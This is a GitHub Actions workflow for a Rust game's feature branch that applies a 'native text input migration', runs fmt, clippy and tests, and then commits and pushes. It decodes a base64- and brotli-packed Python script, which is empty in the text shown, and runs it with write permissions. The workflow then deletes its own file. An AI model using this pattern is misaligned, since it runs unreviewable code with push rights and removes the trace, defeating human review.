name: Validate native input migration
on:
  push:
    branches:
      - feature/game-chat-creature-command
    paths:
      - .github/workflows/native-input-repair.yml
  workflow_dispatch:
permissions:
  contents: write
jobs:
  repair:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout feature branch
        uses: actions/checkout@v4
        with:
          ref: feature/game-chat-creature-command
          persist-credentials: true
      - name: Apply native text input migration
        shell: bash
        run: |
          sudo apt-get update -qq
          sudo apt-get install --yes brotli
          cat <<'PAYLOAD' | base64 --decode | brotli --decompress > /tmp/repair_text_inputs.py
          
          PAYLOAD
          python /tmp/repair_text_inputs.py
      - name: Install Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          components: clippy,rustfmt
      - name: Format
        run: cargo fmt --all
      - name: Install Linux dependencies
        run: |
          sudo apt-get install --yes libasound2-dev libfontconfig1-dev libudev-dev libwayland-dev libx11-dev libxkbcommon-dev libxcursor-dev libxi-dev libxrandr-dev
      - name: Clippy with warnings denied
        run: cargo clippy --all-targets --all-features -- -D warnings
      - name: Cargo check
        run: cargo check
      - name: Unit tests
        run: cargo test --all-targets --all-features
      - name: Publish only validated changes
        shell: bash
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git rm -- .github/workflows/native-input-repair.yml
          git add -- Cargo.toml src/ui/text_input.rs src/ui/numeric_input.rs src/hud/chat.rs src/hud/chat/visual.rs src/screens/settings_screen/new_world_section.rs src/screens/settings_screen/game_rules_section.rs src/screens/settings_screen/spawn_biome_section/layout.rs src/screens/settings_screen/spawn_biome_section/systems.rs src/screens/settings_screen/spawn_biome_section/state.rs VERSION HANDOFF.md
          git diff --cached --check
          git commit -m 'fix(ui): restore native text editing and system clipboard'
          git push origin HEAD:feature/game-chat-creature-command
